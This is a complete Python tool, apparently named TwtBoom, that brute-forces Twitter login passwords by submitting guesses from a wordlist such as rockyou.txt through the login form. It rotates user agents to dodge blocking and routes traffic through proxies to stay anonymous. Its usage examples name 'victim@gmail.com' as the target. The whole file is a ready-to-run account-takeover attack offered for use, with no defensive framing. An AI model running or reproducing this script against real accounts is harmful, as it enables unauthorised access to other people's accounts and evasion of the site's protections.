#!/usr/bin/python
# -*- coding: utf-8 -*-

######################
# SCRIPT : Facebom
#    JOB : Brute Force Attack On Twitter Accounts
#Codedby : Oseid Aldary
######################
##--------------------- Import Libraries --------------------##
import socket,os,sys,optparse,random,time
try:
  import mechanize
except ImportError:
      print("[!] Error: [ mechanize ] Module Is Missed \n[*] Please Install it Using this command> [ pip install mechanize ]")
      exit(1)
try:
  import requests
except ImportError:
  print("[!] Error: [ requests ] Module Is Missed \n[*] Please Install it Using this command> [ pip install requests ]")
  exit(1)

os.system("cls||clear")

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yallow#
#########################

## Check Internet Connection ##
def cnet():
	try:
		socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
		return True
	except socket.error: pass
	return False

#### Check Proxy ####
def cpro(ip,port=None):
  proxy = '{}:8080'.format(ip) if port ==None else '{}:{}'.format(ip,port)
  proxies = {'https': "https://"+proxy, 'http': "http://"+proxy}
  try:
    r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5) 
    if ip==r.headers['X-Client-IP']: return True
    else : return False
  except Exception : return False

#### Choice Random User-Agent ####
def useragent():
    useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)

def find_form(forms):
	fid = 0
	found = 0
	for f in forms:
		if (u'session[username_or_email]', '') in f._pairs():
		    found = 1
		    fid = forms.index(f)
		    break
	if not found:return "block"
	else: return fid
### TWITTER BRUTE FORCE FUNCTION ###
def TBOM(username,wordlist=False,passwd=False,proxy=False):
	if wordlist and not os.path.isfile(wordlist):
		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
		exit(1)
	if not cnet():
		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Intenrnet Connection "+rd+"!!!"+wi)
		exit(1)

	if proxy:
		print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
		if ":" not in proxy:
			if proxy.count(".") ==3:
				if cpro(proxy):
					print(wi+"["+gr+"Connected"+wi+"]")
					useproxy = proxy+":8080"
				else:
					if cpro(proxy, port=80) ==True:
						print(wi+"["+gr+"Connected"+wi+"]")
						useproxy = proxy+":80"
					else:
						print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
						useproxy = False
						print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
						exit(1)
			else:
				useproxy = False
				print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
				exit(1)
		else:
			proxy,port = proxy.split(":")
			if proxy.count(".") ==3:
				if not port.isdigit() or int(port) <0 or int(port) > 65535:
					print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
					exit(1)
				if cpro(proxy, port=port):
					print(wi+"["+gr+"Connected"+wi+"]")
					useproxy = proxy+":"+port
				else:
					print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
					useproxy = False
					print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP/S Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
					exit(1)
			else:
				useproxy = False
				print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid IPv4 ["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
				exit(1)
	else:
		useproxy = False
	prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
	proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
	print(gr+"""
==================================
[---]        """+wi+"""TwtBoom"""+gr+"""         [---]
==================================
[---]  """+wi+"""BruteForce Twitter  """+gr+"""  [---]
==================================
[---]         """+yl+"""CONFIG"""+gr+"""         [---]
==================================
[>] Target      :> """+wi+username+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not passwd else "[>] Password    :> "+yl+str(passwd))+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+gr+"""      
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
==================================
""")
	loop = 1
	br=mechanize.Browser()
	br.set_handle_robots(False)
	if useproxy !=False : br.set_proxies({'https':useproxy, 'http':useproxy})
	br.addheaders=[('User-agent',useragent())]
	issuccess = 0
	if passwd:
		if len(passwd) <6:
			print(yl+"\n["+rd+"!"+yl+"] Invalid Password [ "+rd+passwd+yl+" ]"+rd+" !!!"+wi)
			exit(1)
		passwd = passwd.strip()
		try:
			print(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ] ...")
			br.open("https://twitter.com/login")
			form_id = find_form(br.forms())
			if form_id == "block":
				print("[!] Error: Twitter Server Has Block Your Attack !!!")
				exit(1)
			br.select_form(nr=form_id)
			br.form["session[username_or_email]"]=username
			br.form["session[password]"]=passwd
			br.method="POST"
			if "error" not in br.submit().geturl():
				issuccess = 1
				print(wi+"==> Login"+gr+" Success\n")
				print(wi+"========================="+"="*len(passwd)+"======")
				print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
				print(wi+"========================="+"="*len(passwd)+"======")
			else : print(yl+"==> Login"+rd+" Failed\n")
		except(KeyboardInterrupt,EOFError):
			print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
			time.sleep(1.5)
			issuccess = 2
		except Exception as e:
			issuccess = 2
			print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
			time.sleep(0.60)
		if not issuccess:
			print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
			print(gr+"["+yl+"*"+gr+"]"+yl+" Please Try Other password or Wordlist File "+gr+":)"+wi)          
		exit(1)
	with open(wordlist) as wfile:
		for passwd in wfile:
			if not passwd.strip() or len(passwd.strip()) < 6: continue
			passwd = passwd.strip()
			try:
				print(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ] ...")
				br.open("https://twitter.com/login")
				form_id = find_form(br.forms())
				if form_id == "block":
					print("\n[!] Error: Twitter Server Has Block Your Attack !!!")
					issuccess =2
					break
				br.select_form(nr=form_id)
				br.form["session[username_or_email]"]=username
				br.form["session[password]"]=passwd
				br.method="POST"
				if "error" not in br.submit().geturl():
					issuccess = 1
					print(wi+"==> Login"+gr+" Success\n")
					print(wi+"========================="+"="*len(passwd))
					print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
					print(wi+"========================="+"="*len(passwd))
					break
				else : print(yl+"==> Login"+rd+" Failed\n")
				loop+=1
			except (KeyboardInterrupt,EOFError):
				print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
				time.sleep(1.5)
				issuccess = 2
				break
			except Exception as e:
				print(rd+"["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
				time.sleep(0.60)
	if not issuccess:
			print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
			print(gr+"["+yl+"*"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
	exit(1)
parse = optparse.OptionParser(wi+"""
Usage: python ./twtboom.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------    
    | -t <email> [OR] <username>    ::> Specify target Email [OR] username
    |--------
    | -w <wordlist Path>            ::> Specify Wordlist File Path
    |--------
    | -s <single password>          ::> Specify Single Password To Check
    |--------
    | -p <Proxy IP:PORT>            ::> Specify HTTP/S Proxy (Optional)
-------------
Examples:
        |
     |--------
     | python twtboom.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python twtboom.py -t twitterUserName -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python twtboom.py -t victim@gmail.com -w D:\\wordlist.txt -p 35.236.37.121 
     |--------
     | python twtboom.py -t twitterUserName -w D:\\wordlist.txt -p 35.236.37.121:8998
     |--------
     | python twtboom.py -t victim@gmail.com -s 1234567
     |--------  
""")
def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
      help="Specify Target Email ")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--singe","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy To Be Anonymous When Attack Enabled")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None and options.proxy !=None:
       username = options.taremail
       wordlist = options.wlst
       proxy = options.proxy
       TBOM(username, wordlist=wordlist, proxy=proxy)
   elif options.taremail !=None and options.single !=None and options.proxy !=None:
       username = options.taremail
       passwd = options.single
       proxy = options.proxy
       TBOM(username,passwd=passwd,proxy=proxy)
   elif options.taremail !=None and options.single !=None:
       username = options.taremail
       passwd = options.single
       TBOM(username,passwd=passwd)

   elif options.taremail !=None and options.wlst !=None:
       username = options.taremail
       wordlist = options.wlst
       TBOM(username, wordlist=wordlist)  
   else:
       print(parse.usage)
       exit(1)

if __name__=='__main__':
  Main()

##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Oseid Aldary
#Have a nice day :)
#GoodBye
